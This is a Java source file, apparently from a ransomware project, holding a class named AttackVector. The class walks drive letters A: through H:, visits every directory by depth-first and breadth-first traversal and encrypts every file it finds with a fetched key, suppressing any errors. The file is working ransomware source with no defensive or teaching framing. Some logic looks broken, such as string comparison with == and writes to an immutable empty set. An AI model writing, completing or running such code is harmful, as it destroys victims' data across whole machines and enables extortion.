package Agent.Attack;

import java.io.File;
import java.util.Collection;
import java.util.Collections;

import Agent.EncryptionAlgo.JavaCryptoUtil;
import Agent.entites.CryptoKey;
import Agent.exceptions.CryptoException;
import Agent.exceptions.RansomwareException;
import Agent.traversal.*;

public class AttackVector {

	// Check if specific directory is already found in the folder tree
		private boolean isVisitedFolder(File file, Collection<File> folderTree) {
			if (folderTree == null) {
				return false;
			}

			else {
				boolean isExist = false;
				String tocheck = file.getName();
				isExist = folderTree.stream().anyMatch(t -> t.getName() == tocheck);
				return isExist;
			}

		}

		public void traverseAndEncrypt(String inputDir, Collection<File> dirs, CryptoKey key,Traverse struct) {

			struct.add(new File(inputDir));
			while (!(struct.isEmpty())) {
				/* get next file/directory */
				File current = struct.remove();

				File[] fileDirList = current.listFiles();

				if (fileDirList != null) {
					for (File file : fileDirList) {
						if (file.isDirectory()) {
							try {

								if (!(isVisitedFolder(file, dirs))) {

									dirs.add(file);

								}
							} catch (NullPointerException e) {

							}
							struct.add(file);

						} else if (file.isFile()) {
							JavaCryptoUtil crypto = new JavaCryptoUtil();
							try {
								crypto.encrypt(key.getKey(), file, key.getAlgorithm());
							} catch (CryptoException e) {

							}
						}
					}

				}
			}
		}

	
	private void attack(String inputDir, Collection<File> dirs, CryptoKey key) {
		Traverse dfs = new DFS();
		traverseAndEncrypt(inputDir, dirs, key,dfs);
		// or
		Traverse bfs = new BFS();
		traverseAndEncrypt(inputDir, dirs, key,bfs);
	}

	public void encryptFileSystem() throws RansomwareException {
		try {
			KeyGetter key = new KeyGetter();
			Collection<File> visitedFolders = Collections.emptySet();
			for (char i = 'A'; i <= 'H'; i++) {
				attack(i + ":\\", visitedFolders, key.getKey());
			}
		} catch (Exception e) { 
			throw new RansomwareException();
		}
	}
}
